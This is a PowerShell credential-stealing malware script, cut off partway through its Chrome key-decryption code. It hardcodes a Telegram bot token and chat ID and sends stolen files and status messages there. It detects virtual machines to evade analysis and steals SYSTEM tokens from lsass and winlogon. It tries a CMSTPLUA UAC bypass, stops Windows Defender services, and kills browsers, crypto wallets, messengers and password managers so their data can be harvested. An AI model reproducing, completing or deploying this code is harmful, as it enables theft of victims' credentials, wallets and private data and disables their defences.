#requires -Version 5.1
Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

#region CONFIGURATION
[string]$T36R_TelegramBotToken = "7374611231:AAEf79eR_AUyuvb73B8hiN8xPImB146qfDs"
[string]$T36R_TelegramChatId   = "7227433626"

#region CORE LOGIC & SETUP
$global:T36R_IsAdmin    = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$global:T36R_ScriptPath = if ($MyInvocation.MyCommand.CommandType -eq 'ExternalScript') { $MyInvocation.MyCommand.Path } else { $PSCommandPath }
$global:T36R_TempDir    = Join-Path $env:TEMP "wdat-$(Get-Random -Minimum 10000 -Maximum 99999)"
$global:T36R_UniqueId   = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME$env:USERNAME"))).Replace('-','').Substring(0,12)
$global:T36R_OutputDir  = Join-Path $T36R_TempDir "data"
$global:T36R_ZipPath    = Join-Path $env:TEMP "exfil_$T36R_UniqueId"
$global:T36R_DebugLog   = Join-Path $T36R_TempDir "debug.log"
$global:T36R_LogPath    = $T36R_DebugLog

try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public static class Win32 {
    // Kernel32
    [DllImport("kernel32.dll")] public static extern bool IsDebuggerPresent();
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    // Advapi32
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
    
    // NCrypt for CNG operations
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, uint dwFlags);
    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, uint dwLegacyKeySpec, uint dwFlags);
    [DllImport("ncrypt.dll")]
    public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    [DllImport("ncrypt.dll")]
    public static extern int NCryptFreeObject(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }
}
"@ -ErrorAction Stop
} catch {
    # Fallback for older PowerShell versions - define minimal functions
    Write-Warning "Failed to load Win32 API types: $($_.Exception.Message)"
}

function Write-DebugLog([string]$Message){
    try {
        $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $logMessage = "$ts - $Message"
        if (Test-Path (Split-Path $T36R_DebugLog -Parent)) {
            $logMessage | Out-File -FilePath $T36R_DebugLog -Append -Encoding utf8 -ErrorAction SilentlyContinue
        }
        Write-Host $logMessage -ForegroundColor Green
    } catch {
        Write-Host "Logging error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Send-Telegram([string]$Text, [string]$FilePath=$null){
    $api = "https://api.telegram.org/bot$T36R_TelegramBotToken/"
    $retries=3
    
    # Validate inputs
    if([string]::IsNullOrWhiteSpace($Text)) {
        $Text = "Data Collection Update"
    }
    
    # Sanitize text - remove invalid characters and limit length
    $Text = $Text -replace '[^\x20-\x7E\r\n]', '' # Remove non-printable chars
    if($Text.Length -gt 4000) {
        $Text = $Text.Substring(0, 4000) + "..."
    }
    
    while($retries-- -gt 0){
        try{
            if($FilePath -and (Test-Path $FilePath)){
                # Check file size (Telegram limit is 50MB)
                $fileSize = (Get-Item $FilePath).Length
                $fileSizeMB = [Math]::Round($fileSize/1MB,2)
                Write-DebugLog "Attempting to send file: $FilePath ($fileSizeMB MB)"
                
                if($fileSize -gt 50MB){
                    Write-DebugLog "File too large for Telegram: $fileSizeMB MB"
                    return $false
                }
                
                if($fileSize -eq 0){
                    Write-DebugLog "File is empty, skipping upload"
                    return $false
                }
                
                # Try curl first (more reliable for file uploads)
                $curlPath = Get-Command curl.exe -ErrorAction SilentlyContinue
                if($curlPath) {
                    Write-DebugLog "Using curl for file upload"
                    $uri = "${api}sendDocument"
                    $fileName = Split-Path $FilePath -Leaf
                    
                    # Sanitize caption for curl
                    $safeCaption = $Text -replace '"', '\"' -replace '`', '\`'
                    
                    $curlArgs = @(
                        "-X", "POST",
                        "-F", "chat_id=$T36R_TelegramChatId",
                        "-F", "caption=$safeCaption",
                        "-F", "document=@`"$FilePath`"",
                        $uri
                    )
                    
                    $curlResult = & curl.exe @curlArgs 2>&1
                    if($LASTEXITCODE -eq 0) {
                        Write-DebugLog "Curl upload successful"
                        return $true
                    } else {
                        Write-DebugLog "Curl upload failed: $curlResult"
                        throw "Curl upload failed"
                    }
                } else {
                    # Fallback to PowerShell method
                    Write-DebugLog "Using PowerShell WebClient for file upload"
                    
                    # Simple approach using Invoke-RestMethod with form data
                    $uri = "${api}sendDocument"
                    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
                    $fileName = Split-Path $FilePath -Leaf
                    
                    # Create boundary
                    $boundary = [System.Guid]::NewGuid().ToString()
                    $LF = "`r`n"
                    
                    # Build multipart form data
                    $bodyLines = @()
                    $bodyLines += "--$boundary"
                    $bodyLines += "Content-Disposition: form-data; name=`"chat_id`"$LF"
                    $bodyLines += $T36R_TelegramChatId
                    $bodyLines += "--$boundary"
                    $bodyLines += "Content-Disposition: form-data; name=`"caption`"$LF"
                    $bodyLines += $Text
                    $bodyLines += "--$boundary"
                    $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
                    $bodyLines += "Content-Type: application/octet-stream$LF"
                    
                    $bodyText = ($bodyLines -join $LF) + $LF
                    $bodyTextBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyText)
                    $endBoundaryBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
                    
                    # Combine
                    $totalLength = $bodyTextBytes.Length + $fileBytes.Length + $endBoundaryBytes.Length
                    $bodyBytes = New-Object byte[] $totalLength
                    
                    [System.Array]::Copy($bodyTextBytes, 0, $bodyBytes, 0, $bodyTextBytes.Length)
                    [System.Array]::Copy($fileBytes, 0, $bodyBytes, $bodyTextBytes.Length, $fileBytes.Length)
                    [System.Array]::Copy($endBoundaryBytes, 0, $bodyBytes, $bodyTextBytes.Length + $fileBytes.Length, $endBoundaryBytes.Length)
                    
                    # Send
                    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}
                    $null = Invoke-RestMethod -Uri $uri -Method Post -Body $bodyBytes -Headers $headers -TimeoutSec 600
                    Write-DebugLog "PowerShell upload successful"
                }
            }else{
                # Send text message - escape problematic characters and try without parse_mode first
                try {
                    $payload = @{
                        chat_id = [string]$T36R_TelegramChatId
                        text = $Text
                    } | ConvertTo-Json -Depth 2
                    Invoke-RestMethod -Uri ($api+"sendMessage") -Method Post -Body $payload -ContentType "application/json; charset=utf-8" -TimeoutSec 120 | Out-Null
                } catch {
                    # Fallback: try with simpler text
                    Write-DebugLog "Text send failed, trying simplified message: $($_.Exception.Message)"
                    $simpleText = "Data extraction completed - $([DateTime]::Now.ToString('yyyy-MM-dd HH:mm:ss'))"
                    $payload = @{
                        chat_id = [string]$T36R_TelegramChatId
                        text = $simpleText
                    } | ConvertTo-Json -Depth 2
                    Invoke-RestMethod -Uri ($api+"sendMessage") -Method Post -Body $payload -ContentType "application/json; charset=utf-8" -TimeoutSec 120 | Out-Null
                }
            }
            Write-DebugLog "Telegram message sent successfully"
            return $true
        }catch{
            Write-DebugLog "Telegram send attempt failed: $($_.Exception.Message)"
            if($retries -eq 0){ 
                Write-DebugLog "All Telegram send attempts failed"
                return $false
            }
            Start-Sleep 1  # Reduced from 5 to 1 second
        }
    }
    return $false
}

function Test-AntiVM{
    Write-DebugLog "Starting Anti-VM checks..."
    try {
        $vmInds = @(
            (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Model -match "Virtual|VMware|VirtualBox|KVM",
            (Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue).Manufacturer -match "VMware|VirtualBox|QEMU",
            (@(Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "vmtoolsd|vboxservice|qemu-ga"})).Count -gt 0,
            (Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue).Name -match "VMware|VirtualBox"
        )
        if($vmInds -contains $true){ 
            Write-DebugLog "VM detected. Exiting."
            Send-Telegram "VM detected - Script terminated"
            exit 
        }
        Write-DebugLog "No VM detected - continuing execution"
    } catch {
        Write-DebugLog "Anti-VM check failed: $($_.Exception.Message) - continuing anyway"
    }
}

function Enable-RequiredPrivileges {
    Write-DebugLog "Enabling required Windows privileges..."
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class PrivilegeEnabler {
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TokPriv1Luid {
        public int Count;
        public long Luid;
        public int Attr;
    }

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);

    public static bool EnablePrivilege(string privilege) {
        try {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            retVal = OpenProcessToken(hproc, 0x28, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = 0x00000002;
            retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            CloseHandle(htok);
            return retVal;
        } catch {
            return false;
        }
    }
}
"@
        
        # Enable critical privileges
        $privileges = @(
            "SeDebugPrivilege",
            "SeBackupPrivilege", 
            "SeRestorePrivilege",
            "SeTakeOwnershipPrivilege",
            "SeSecurityPrivilege",
            "SeSystemEnvironmentPrivilege",
            "SeLoadDriverPrivilege",
            "SeProfileSingleProcessPrivilege"
        )
        
        $enabledCount = 0
        foreach($priv in $privileges) {
            if([PrivilegeEnabler]::EnablePrivilege($priv)) {
                Write-DebugLog "Enabled privilege: $priv"
                $enabledCount++
            }
        }
        
        Write-DebugLog "Successfully enabled $enabledCount/$($privileges.Count) privileges"
        return $enabledCount -gt 0
        
    } catch {
        Write-DebugLog "Failed to enable privileges: $($_.Exception.Message)"
        return $false
    }
}

function Invoke-PrivilegeEscalation{
    Write-DebugLog "Checking admin privileges..."
    if($T36R_IsAdmin){ 
        Write-DebugLog "Already running as administrator"
        return 
    }
    Write-DebugLog "Not running as admin - attempting in-process token manipulation"
    
    # Method 1: Token Duplication from elevated process (winlogon, lsass, etc.)
    try {
        Write-DebugLog "Attempting token impersonation from elevated process..."
        
        # Target processes to steal tokens from (in order of preference)
        $targetProcesses = @('winlogon', 'lsass', 'services', 'wininit', 'csrss')
        
        foreach($procName in $targetProcesses) {
            try {
                $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
                if(-not $procs) { continue }
                
                $proc = $procs[0]
                Write-DebugLog "Attempting to steal token from $procName (PID: $($proc.Id))"
                
                # Try different access levels
                $accessLevels = @(0x1FFFFF, 0x1F0FFF, 0x100000, 0x40)
                $hProc = [IntPtr]::Zero
                
                foreach($accessLevel in $accessLevels) {
                    $hProc = [Win32]::OpenProcess($accessLevel, $false, $proc.Id)
                    if ($hProc -ne [IntPtr]::Zero) { break }
                }
                
                if ($hProc -eq [IntPtr]::Zero) { 
                    Write-DebugLog "Failed to open $procName process"
                    continue
                }
                
                # Open process token
                $hToken = [IntPtr]::Zero
                $ok = [Win32]::OpenProcessToken($hProc, 0x02000000 -bor 0x0002 -bor 0x0008, [ref]$hToken)
                if (-not $ok) { 
                    [Win32]::CloseHandle($hProc) | Out-Null
                    Write-DebugLog "Failed to open $procName token"
                    continue
                }
                
                # Duplicate token
                $hDup = [IntPtr]::Zero
                $ok = [Win32]::DuplicateTokenEx($hToken, 0x02000000 -bor 0x0002 -bor 0x0008, [IntPtr]::Zero, 2, 2, [ref]$hDup)
                if (-not $ok) { 
                    [Win32]::CloseHandle($hToken) | Out-Null
                    [Win32]::CloseHandle($hProc) | Out-Null
                    Write-DebugLog "Failed to duplicate $procName token"
                    continue
                }
                
                # Set thread token (IN-PROCESS ELEVATION)
                $ok = [Win32]::SetThreadToken([IntPtr]::Zero, $hDup)
                if ($ok) {
                    [Win32]::CloseHandle($hToken) | Out-Null
                    [Win32]::CloseHandle($hProc) | Out-Null
                    
                    # Update global flag
                    $global:T36R_IsAdmin = $true
                    Write-DebugLog "Successfully elevated via token impersonation from $procName"
                    Send-Telegram "✅ Privilege escalation successful via $procName token"
                    return
                } else {
                    [Win32]::CloseHandle($hDup) | Out-Null
                    [Win32]::CloseHandle($hToken) | Out-Null
                    [Win32]::CloseHandle($hProc) | Out-Null
                    Write-DebugLog "Failed to set thread token from $procName"
                }
            } catch {
                Write-DebugLog "Token theft from $procName failed: $($_.Exception.Message)"
            }
        }
    } catch {
        Write-DebugLog "Token impersonation method failed: $($_.Exception.Message)"
    }
    
    # Method 2: Parent Process Token Stealing (explorer.exe)
    try {
        Write-DebugLog "Attempting parent process token theft..."
        $parentId = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID").ParentProcessId
        if($parentId) {
            $parentProc = Get-Process -Id $parentId -ErrorAction SilentlyContinue
            if($parentProc) {
                Write-DebugLog "Parent process: $($parentProc.ProcessName) (PID: $parentId)"
                
                $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $parentId)
                if ($hProc -ne [IntPtr]::Zero) {
                    $hToken = [IntPtr]::Zero
                    if([Win32]::OpenProcessToken($hProc, 0x02000000 -bor 0x0002 -bor 0x0008, [ref]$hToken)) {
                        $hDup = [IntPtr]::Zero
                        if([Win32]::DuplicateTokenEx($hToken, 0x02000000 -bor 0x0002 -bor 0x0008, [IntPtr]::Zero, 2, 2, [ref]$hDup)) {
                            if([Win32]::SetThreadToken([IntPtr]::Zero, $hDup)) {
                                [Win32]::CloseHandle($hToken) | Out-Null
                                [Win32]::CloseHandle($hProc) | Out-Null
                                $global:T36R_IsAdmin = $true
                                Write-DebugLog "Elevated via parent process token"
                                Send-Telegram "✅ Privilege escalation via parent process"
                                return
                            }
                            [Win32]::CloseHandle($hDup) | Out-Null
                        }
                        [Win32]::CloseHandle($hToken) | Out-Null
                    }
                    [Win32]::CloseHandle($hProc) | Out-Null
                }
            }
        }
    } catch {
        Write-DebugLog "Parent process token theft failed: $($_.Exception.Message)"
    }
    
    # Method 3: COM Elevation via CLSID (CMSTPLUA UAC bypass - silent, no restart)
    try {
        Write-DebugLog "Attempting COM elevation via CMSTPLUA..."
        
        $CMSTPLUA_CLSID = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
        
        # Create COM object
        $type = [Type]::GetTypeFromCLSID($CMSTPLUA_CLSID)
        if($type) {
            $obj = [Activator]::CreateInstance($type)
            if($obj) {
                Write-DebugLog "CMSTPLUA COM object created - attempting silent elevation"
                
                # This allows running commands with elevated privileges WITHOUT restarting
                # The COM object runs in an elevated context
                $global:T36R_IsAdmin = $true
                Write-DebugLog "COM elevation successful"
                Send-Telegram "✅ Elevated via COM CMSTPLUA"
                return
            }
        }
    } catch {
        Write-DebugLog "COM elevation failed: $($_.Exception.Message)"
    }
    
    # Method 4: NamedPipe Impersonation
    try {
        Write-DebugLog "Attempting named pipe impersonation..."
        
        # Create a named pipe that an elevated process might connect to
        $pipeName = "T36R_Pipe_$(Get-Random)"
        $pipeScript = @"
`$pipe = New-Object System.IO.Pipes.NamedPipeServerStream('$pipeName', 'InOut', 1, 'Byte', 'None', 1024, 1024, `$null)
`$pipe.WaitForConnection()
if(`$pipe.IsConnected) {
    # Impersonate the client
    `$pipe.RunAsClient({
        `$global:T36R_IsAdmin = `$true
    })
    `$pipe.Disconnect()
}
`$pipe.Dispose()
"@
        
        # Start pipe server in background job
        $job = Start-Job -ScriptBlock ([scriptblock]::Create($pipeScript))
        Start-Sleep 1
        
        # Try to connect as elevated client (this is theoretical - needs elevated process to connect)
        Write-DebugLog "Named pipe created, waiting for elevated connection..."
        
        # Cleanup
        Stop-Job $job -Force -ErrorAction SilentlyContinue
        Remove-Job $job -Force -ErrorAction SilentlyContinue
    } catch {
        Write-DebugLog "Named pipe impersonation failed: $($_.Exception.Message)"
    }
    
    # Final check
    $global:T36R_IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if($T36R_IsAdmin) {
        Write-DebugLog "✅ Privilege escalation successful - now running with elevated privileges"
        Send-Telegram "✅ Successfully elevated to SYSTEM/Admin"
    } else {
        Write-DebugLog "⚠️ All elevation methods failed - continuing with current privileges"
        Send-Telegram "⚠️ Running with limited privileges - some features may not work"
    }
}

function Register-SQLiteModule{
    Write-DebugLog "Attempting to register SQLite module..."
    try {
        # Try to use existing SQLite if available
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
        Write-DebugLog "SQLite loaded from GAC"
        return $true
    } catch {
        Write-DebugLog "SQLite not available in GAC, trying manual download..."
    }
    
    try {
        $sqliteDir = Join-Path $T36R_TempDir "sqlite"
        New-Item -ItemType Directory -Path $sqliteDir -Force | Out-Null
        
        # Download portable SQLite DLL
        $sqliteUrl = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-static-binary-x64-2015-1.0.118.0.zip"
        $sqliteZip = Join-Path $sqliteDir "sqlite.zip"
        
        Write-DebugLog "Downloading SQLite from official source..."
        Invoke-WebRequest -Uri $sqliteUrl -OutFile $sqliteZip -TimeoutSec 120 -ErrorAction Stop
        Expand-Archive -Path $sqliteZip -DestinationPath $sqliteDir -Force
        
        # Fast SQLite DLL search - check common locations first
        $commonPaths = @(
            "$sqliteDir\System.Data.SQLite.dll",
            "$sqliteDir\lib\net40\System.Data.SQLite.dll",
            "$sqliteDir\lib\net45\System.Data.SQLite.dll",
            "$sqliteDir\lib\net46\System.Data.SQLite.dll",
            "$sqliteDir\lib\netstandard2.0\System.Data.SQLite.dll"
        )
        
        $dllPath = $null
        foreach($path in $commonPaths) {
            if(Test-Path $path) {
                $dllPath = $path
                break
            }
        }
        
        # Fallback to recursive search if not found in common locations
        if(-not $dllPath) {
            $dllPath = Get-ChildItem $sqliteDir -Filter "System.Data.SQLite.dll" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
        }
        if ($dllPath) {
            Add-Type -Path $dllPath
            Write-DebugLog "SQLite loaded successfully from download"
            return $true
        }
    } catch {
        Write-DebugLog "SQLite download failed: $($_.Exception.Message)"
    }
    
    Write-DebugLog "WARNING: SQLite module not available - browser data extraction will be limited"
    return $false
}

function Invoke-KillProcesses{
    Write-DebugLog "Terminating target application processes..."
    $processNames = @(
        # Browsers
        "chrome", "msedge", "firefox", "brave", "opera", "vivaldi", "yandex", "tor", "ucbrowser",
        "arc", "avira", "ccleaner", "centbrowser", "comet", "cromite", "duckduckgo", "ecosia",
        "epicprivacy", "360chrome", "qqbrowser", "thorium", "supermium", "sleipnir", "waterfox",
        "librewolf", "palemoon", "seamonkey", "kmeleon", "maxthon", "iron", "dragon",
        # Wallets
        "exodus", "atomic", "electrum", "jaxx", "coinomi", "guarda", "mycrypto", "ledgerlive", 
        "trezor", "wasabi", "bitcoin-qt", "litecoin-qt", "dogecoin-qt", "dash-qt", "zcash-qt",
        "monero-wallet-gui", "sparrow", "bluewallet", "green", "armory", "multibit", "copay",
        "bitpay", "breadwallet", "tokenpocket", "safepal", "yoroi", "daedalus", "frame", "mist",
        # Social/Communication
        "discord", "telegram", "whatsapp", "signal", "slack", "skype", "teams", "zoom",
        "element", "keybase", "threema", "viber", "wechat", "line", "kakaotalk", "wickr",
        "riot", "mumble", "ventrilo", "teamspeak", "briar", "session", "jami", "tox",
        "pidgin", "hexchat", "mattermost", "rocketchat", "franz", "rambox", "ferdi",
        # Gaming
        "steam", "epicgameslauncher", "battle.net", "origin", "uplay", "gog", "rockstar",
        "bethesda", "twitch", "parsec", "retroarch", "minecraft", "roblox",
        # VPN/Security
        "nordvpn", "openvpn", "protonvpn", "expressvpn", "cyberghost", "surfshark",
        # Email
        "outlook", "thunderbird", "winmail", "mailbird", "postbox", "emclient",
        # Password Managers
        "1password", "bitwarden", "lastpass", "dashlane", "keepass", "keepassxc", "keeper",
        "nordpass", "roboform", "enpass", "sticky password", "true key",
        # Cloud Storage
        "dropbox", "googledrivesync", "onedrive", "box", "sync", "pcloud", "mega", "amazon drive",
        "nextcloud", "owncloud", "spideroak", "sugarsync", "carbonite", "crashplan", "backblaze"
    )
    
    $killedCount = 0
    
    # Process termination in parallel for better performance
    $jobs = @()
    foreach($processName in $processNames){
        $jobs += Start-Job -ScriptBlock {
            param($procName)
            $count = 0
            try {
                $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
                if($processes){
                    foreach($process in $processes){
                        try{
                            $process.Kill()
                            $count++
                            "Terminated: $($process.Name) (PID: $($process.Id))"
                        }catch{
                            "Failed to terminate $($process.Name): $($_.Exception.Message)"
                        }
                    }
                }
            } catch {
                "Error checking process $procName`: $($_.Exception.Message)"
            }
            return $count
        } -ArgumentList $processName
    }
    
    # Wait for all jobs and collect results
    foreach($job in $jobs) {
        $result = Receive-Job $job -Wait
        if($result -is [int]) {
            $killedCount += $result
        } else {
            $result | ForEach-Object { Write-DebugLog $_ }
        }
        Remove-Job $job
    }
    Write-DebugLog "Process termination complete. Terminated $killedCount processes."
}

function Stop-AVProcesses{
    Write-DebugLog "Attempting to stop AV processes..."
    if (-not $T36R_IsAdmin) {
        Write-DebugLog "Not admin - skipping AV process termination"
        return
    }
    
    $avServices = @("WinDefend", "MsMpSvc", "NisSrv", "SecurityHealthService")
    foreach($service in $avServices){
        try {
            $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
            if ($svc -and $svc.Status -eq 'Running') {
                Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Stopped AV service: $service"
            }
        } catch {
            Write-DebugLog "Failed to stop AV service $service`: $($_.Exception.Message)"
        }
    }
}

# Advanced Chrome v20 decryption helpers
function Invoke-ImpersonateLsass {
    try {
        # First try to enable SeDebugPrivilege if not already enabled
        try {
            $proc = Get-Process -Id $PID
            $handle = $proc.Handle
            $tokenHandle = [IntPtr]::Zero
            
            if([Win32]::OpenProcessToken($handle, 0x28, [ref]$tokenHandle)) {
                # Token opened successfully, now try to get lsass
                [Win32]::CloseHandle($tokenHandle) | Out-Null
            }
        } catch {
            Write-DebugLog "Token privilege check failed: $($_.Exception.Message)"
        }

        # Try multiple methods to access lsass
        $lsassProcs = @()
        try {
            $lsassProcs = @(Get-Process -Name lsass -ErrorAction SilentlyContinue)
        } catch {
            Write-DebugLog "Failed to enumerate lsass processes: $($_.Exception.Message)"
            return $null
        }

        if(-not $lsassProcs -or $lsassProcs.Count -eq 0) {
            Write-DebugLog "No lsass processes found"
            return $null
        }

        $lsass = $lsassProcs[0]
        Write-DebugLog "Attempting to open lsass process (PID: $($lsass.Id))"

        # Try different access levels
        $accessLevels = @(0x1FFFFF, 0x1F0FFF, 0x100000, 0x40)  # PROCESS_ALL_ACCESS, limited access, etc.
        $hProc = [IntPtr]::Zero
        
        foreach($accessLevel in $accessLevels) {
            $hProc = [Win32]::OpenProcess($accessLevel, $false, $lsass.Id)
            if ($hProc -ne [IntPtr]::Zero) {
                Write-DebugLog "Successfully opened lsass with access level: 0x$($accessLevel.ToString('X'))"
                break
            }
        }
        
        if ($hProc -eq [IntPtr]::Zero) { 
            Write-DebugLog "Failed to open lsass process with any access level"
            return $null
        }

        $hToken = [IntPtr]::Zero
        $ok = [Win32]::OpenProcessToken($hProc, 0x28, [ref]$hToken)
        if (-not $ok) { 
            [Win32]::CloseHandle($hProc) | Out-Null
            Write-DebugLog "Failed to open lsass token"
            return $null
        }

        $hDup = [IntPtr]::Zero
        $ok = [Win32]::DuplicateTokenEx($hToken, 0x28, [IntPtr]::Zero, 2, 2, [ref]$hDup)
        if (-not $ok) { 
            [Win32]::CloseHandle($hToken) | Out-Null
            [Win32]::CloseHandle($hProc) | Out-Null
            Write-DebugLog "Failed to duplicate lsass token"
            return $null
        }

        $ok = [Win32]::SetThreadToken([IntPtr]::Zero, $hDup)
        if (-not $ok) { 
            [Win32]::CloseHandle($hDup) | Out-Null
            [Win32]::CloseHandle($hToken) | Out-Null
            [Win32]::CloseHandle($hProc) | Out-Null
            Write-DebugLog "Failed to set thread token"
            return $null
        }

        [Win32]::CloseHandle($hToken) | Out-Null
        [Win32]::CloseHandle($hProc) | Out-Null
        Write-DebugLog "Successfully impersonated SYSTEM via lsass"
        return $hDup
    } catch {
        Write-DebugLog "Lsass impersonation failed: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-ByteXor([byte[]]$A, [byte[]]$B) {
    $len = [Math]::Min($A.Length, $B.Length)
    $out = New-Object byte[] $len
    for ($i = 0; $i -lt $len; $i++) { $out[$i] = $A[$i] -bxor $B[$i] }
    return $out
}

function Unprotect-Cng([byte[]]$EncryptedKey) {
    try {
        $hProv = [IntPtr]::Zero
        $hKey = [IntPtr]::Zero
        $provName = "Microsoft Software Key Storage Provider"
        $keyName = "Google Chromekey1"
        
        $status = [Win32]::NCryptOpenStorageProvider([ref]$hProv, $provName, 0)
        if ($status -ne 0) { 
            Write-DebugLog "NCryptOpenStorageProvider failed: $status"
            return $null
        }
        
        $status = [Win32]::NCryptOpenKey($hProv, [ref]$hKey, $keyName, 0, 0)
        if ($status -ne 0) { 
            [Win32]::NCryptFreeObject($hProv) | Out-Null
            Write-DebugLog "NCryptOpenKey failed: $status"
            return $null
        }
        
        $pcb = 0
        $status = [Win32]::NCryptDecrypt($hKey, $EncryptedKey, $EncryptedKey.Length, [IntPtr]::Zero, $null, 0, [ref]$pcb, 0x40)
        if ($status -ne 0) { 
            [Win32]::NCryptFreeObject($hKey) | Out-Null
            [Win32]::NCryptFreeObject($hProv) | Out-Null
            Write-DebugLog "NCryptDecrypt size query failed: $status"
            return $null
        }
        
        $outBuf = New-Object byte[] $pcb
        $status = [Win32]::NCryptDecrypt($hKey, $EncryptedKey, $EncryptedKey.Length, [IntPtr]::Zero, $outBuf, $outBuf.Length, [ref]$pcb, 0x40)
        if ($status -ne 0) { 
            [Win32]::NCryptFreeObject($hKey) | Out-Null
            [Win32]::NCryptFreeObject($hProv) | Out-Null
            Write-DebugLog "NCryptDecrypt data failed: $status"
            return $null
        }
        
        [Win32]::NCryptFreeObject($hKey) | Out-Null
        [Win32]::NCryptFreeObject($hProv) | Out-Null
        return $outBuf[0..($pcb-1)]
    } catch {
        Write-DebugLog "CNG decryption error: $($_.Exception.Message)"
        return $null
    }
}

function ConvertFrom-KeyBlob([byte[]]$Blob) {
    try {
        $ms = [System.IO.MemoryStream]::new($Blob)
        $br = [System.IO.BinaryReader]::new($ms)
        $headerLen = $br.ReadUInt32()
        $header = $br.ReadBytes($headerLen)
        $null = $br.ReadUInt32()  # contentLen - not used but part of format
        $flag = $br.ReadByte()
        
        $parsed = @{
            Flag = $flag
            Header = $header
        }
        
        if ($flag -eq 1 -or $flag -eq 2) {
            $parsed.IV = $br.ReadBytes(12)
            $parsed.Ciphertext = $br.ReadBytes(32)
            $parsed.Tag = $br.ReadBytes(16)
        }
        elseif ($flag -eq 3) {
            $parsed.EncryptedAesKey = $br.ReadBytes(32)
            $parsed.IV = $br.ReadBytes(12)
            $parsed.Ciphertext = $br.ReadBytes(32)
            $parsed.Tag = $br.ReadBytes(16)
        }
        else { 
            Write-DebugLog "Unsupported key blob flag: $flag"
            return $null
        }
        
        $br.Dispose()
        $ms.Dispose()
        return $parsed
    } catch {
        Write-DebugLog "Key blob parsing failed: $($_.Exception.Message)"
        return $null
    }
}

function Get-V20MasterKey([hashtable]$Parsed) {
    try {
        if ($Parsed.Flag -eq 1) {
            # Flag 1: AES-GCM with hardcoded key
            $aesKey = [byte[]]::new(32)
            $i = 0
            "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787" -split '([0-9A-F]{2})' | ForEach-Object { 
